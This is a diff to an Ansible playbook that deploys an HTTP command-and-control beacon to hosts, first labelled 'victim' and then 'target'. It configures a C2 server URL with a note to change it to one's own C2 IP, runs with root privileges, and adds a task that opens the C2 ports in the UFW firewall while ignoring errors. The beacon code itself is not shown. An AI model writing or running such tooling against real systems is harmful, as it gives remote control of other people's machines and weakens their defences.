@@ -1,6 +1,6 @@
 ---
 - name: Deploy HTTP Beacon to Target Systems
-  hosts: victim
+  hosts: target
   become: yes
   vars:
     c2_server_url: "http://100.65.2.138:8080"  # Change to your C2 IP
@@ -9,6 +9,16 @@
     check_in_interval: 60
 
   tasks:
+
+    - name: Open C2 ports in UFW firewall (Ubuntu/Debian)
+      ufw:
+        rule: allow
+        port: "{{ item }}"
+        proto: tcp
+      loop: "{{ c2_ports }}"
+      when: ansible_os_family == "Debian"
+      ignore_errors: yes
+      
     - name: Check if Python3 is installed
       command: which python3
       register: python_check
